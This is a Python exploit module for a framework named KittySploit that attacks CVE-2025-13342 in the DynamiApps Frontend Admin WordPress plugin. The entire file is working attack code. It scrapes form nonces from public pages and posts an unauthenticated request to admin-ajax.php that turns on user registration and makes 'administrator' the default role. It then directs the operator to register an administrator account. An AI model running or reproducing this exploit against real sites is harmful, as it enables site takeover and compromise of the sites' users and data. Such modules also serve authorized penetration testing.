#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2025-13342 — Frontend Admin unauthenticated wp options update."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "DynamiApps Frontend Admin CVE-2025-13342 BAC",
        "description": (
            "Sets users_can_register=1 and default_role=administrator via frontend_admin/form_submit."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-13342"],
        "tags": [
            "auxiliary", "wordpress", "frontend-admin", "bac", "privesc", "cve-2025-13342"],
        "agent": {"approval_required": True, "produces": ["credentials", "risk_signals"]},
    }

    path = OptString("/", "WordPress base path", required=False)
    form_path = OptString("", "Page with frontend form", required=False)
    acf_nonce = OptString("", "_acf_nonce", required=False)
    acf_form = OptString("", "_acf_form value", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _discover(self):
        if (self.acf_nonce or "").strip() and (self.acf_form or "").strip():
            return self.acf_nonce.strip(), self.acf_form.strip()
        paths = [self.form_path] if (self.form_path or "").strip() else ["/", "/register/", "/frontend-form/"]
        for rel in paths:
            rel = rel if str(rel).startswith("/") else f"/{rel}"
            page = self.http_request(method="GET", path=self._join(rel), allow_redirects=True)
            if not page:
                continue
            html = page.text or ""
            n = re.search(r'name="_acf_nonce"[^>]*value="([a-f0-9]+)"', html)
            f = re.search(r'name="_acf_form"[^>]*value="([^"]+)"', html)
            if n and f:
                return n.group(1), f.group(1)
        return "", ""

    def run(self):
        nonce, form = self._discover()
        if not nonce:
            print_error("_acf_nonce/_acf_form not found")
            return False
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"X-Requested-With": "XMLHttpRequest"},
            data={
                "_acf_nonce": nonce,
                "_acf_form": form,
                "action": "frontend_admin/form_submit",
                "acff[admin_options][users_can_register]": "1",
                "acff[admin_options][default_role]": "administrator",
            },
            allow_redirects=False,
        )
        reg = self.http_request(method="GET", path=self._join("/wp-login.php"), params={"action": "register"})
        body = reg.text or "" if reg else ""
        if resp and int(resp.status_code or 0) == 200:
            print_success("admin_options update submitted")
            if "user_login" in body and "registration is not allowed" not in body.lower():
                print_success("Registration now appears enabled — register administrator at wp-login.php?action=register")
                return True
            print_status("Confirm users_can_register via wp-login.php?action=register")
            return True
        print_error("form_submit failed")
        return False
